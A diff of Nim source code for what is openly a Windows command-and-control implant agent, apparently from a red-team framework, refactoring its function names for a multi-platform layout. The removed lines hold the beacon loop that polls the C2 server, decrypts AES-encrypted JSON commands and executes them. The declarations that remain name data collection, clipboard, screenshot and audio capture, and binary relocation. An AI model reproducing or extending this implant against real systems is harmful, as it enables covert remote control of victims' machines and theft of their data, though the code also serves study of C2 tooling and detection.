@@ -2,8 +2,8 @@
 include ../config
 import ../common
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
-# External imports
-import std/[strformat, tables, nativesockets, random, json, streams]
+# Internal imports
+import std/[tables, nativesockets, json, streams]
 import winim/[lean, com]
 import wAuto/[registry]
 import system/[io]
@@ -15,9 +15,8 @@ import crc32
 import os
 
 # Core functions
-proc start(): void
-proc parse_command(command: JsonNode): bool
-proc nimbo_main*(): void 
+proc windows_start*(): void
+proc windows_parse_command*(command: JsonNode): bool
 
 # Command executors
 proc collect_data(): bool
@@ -42,12 +41,11 @@ proc speak(text: string): bool
 proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
 
 # Helpers
-proc get_agent_id(): string
+proc get_windows_agent_id*(): string
 proc is_elevated(): string
 
 # Globals
-let client = newHttpClient(userAgent=get_agent_id())
-let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
+let client = newHttpClient(userAgent=get_windows_agent_id())
 
 
 #########################
@@ -548,7 +546,7 @@ proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
 #########################
 
 
-proc get_agent_id(): string =
+proc get_windows_agent_id*(): string =
     var uuid: string
     var guid: string
 
@@ -574,7 +572,7 @@ proc is_elevated(): string =
 ##########################
 
 
-proc start(): void =
+proc windows_start*(): void =
     sleep(sleep_on_execution * 1000)
     let binary_path = getAppFilename()
     if is_exe and (binary_path != agent_execution_path):
@@ -585,7 +583,7 @@ proc start(): void =
         ExitProcess(0)
 
 
-proc parse_command(command: JsonNode): bool =
+proc windows_parse_command*(command: JsonNode): bool =
     var is_success: bool
     var command_type = command[protectString("command_type")].getStr()
 
@@ -644,29 +642,3 @@ proc parse_command(command: JsonNode): bool =
         else:
             is_success = false
     return is_success
-
-
-proc nimbo_main*(): void =
-    var res: Response
-    var server_content: JsonNode
-    var is_success: bool
-
-    start()
-
-    while true:
-        try:
-            res = client.get(c2_url)
-        except:
-            continue
-
-        server_content =  parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
-
-        if len(server_content) == 0:
-            sleep(calc_sleep_time(call_home_timeframe, call_home_jitter_percent))
-            continue
-        else:
-            for command in server_content:
-                try:
-                    is_success = parse_command(command)
-                except:
-                    discard
